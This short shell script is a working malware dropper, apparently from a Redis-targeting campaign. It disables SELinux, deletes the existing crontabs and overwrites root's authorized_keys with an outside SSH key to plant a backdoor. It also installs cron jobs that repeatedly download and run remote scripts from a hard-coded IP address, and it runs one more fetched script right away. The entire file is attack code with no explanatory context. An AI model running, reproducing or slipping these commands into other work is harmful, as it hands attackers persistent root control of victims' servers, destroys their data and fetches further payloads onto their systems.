uname -a
id
hostname
setenforce 0 2>/dev/null
ulimit -n 50000
ulimit -u 50000
crontab -r 2>/dev/null
rm -rf /var/spool/cron/* 2>/dev/null
mkdir -p /var/spool/cron/crontabs 2>/dev/null
mkdir -p /root/.ssh 2>/dev/null
echo 'ssh-rsa
 
AAAAB3NzaC1yc2EAAAADAQABAAABAQDfB19N9slQ6uMNY8dVZmTQAQhrdhlMsXVJeUD4AIH2tbg6Xk5PmwOpTeO5FhWRO11dh3inlvxxX5RRa/oKCWk0NNKmMza8YGLBiJsq/zsZYv6H6Haf51FCbTXf6lKt9g4LGoZkpNdhLIwPwDpB/B7nZqQYdTmbpEoCn6oHFYeimMEOqtQPo/szA9pX0RlOHgq7Duuu1ZjR68fTHpgc2qBSG37Sg2aTUR4CRzD4Li5fFXauvKplIim02pEY2zKCLtiYteHc0wph/xBj8wGKpHFP0xMbSNdZ/cmLMZ5S14XFSVSjCzIa0+xigBIrdgo2p5nBtrpYZ2/GN3+ThY+PNUqx
 redisX' > /root/.ssh/authorized_keys
echo '*/15 * * * * curl -fsSL 159.89.190.243/ash.php|sh' > /var/spool/cron/root
echo '*/20 * * * * curl -fsSL 159.89.190.243/ash.php|sh' > /var/spool/cron/crontabs/root

yum install -y bash 2>/dev/null
apt install -y bash 2>/dev/null
apt-get install -y bash 2>/dev/null

bash -c 'curl -fsSL 159.89.190.243/bsh.php|bash' 2>/dev/null
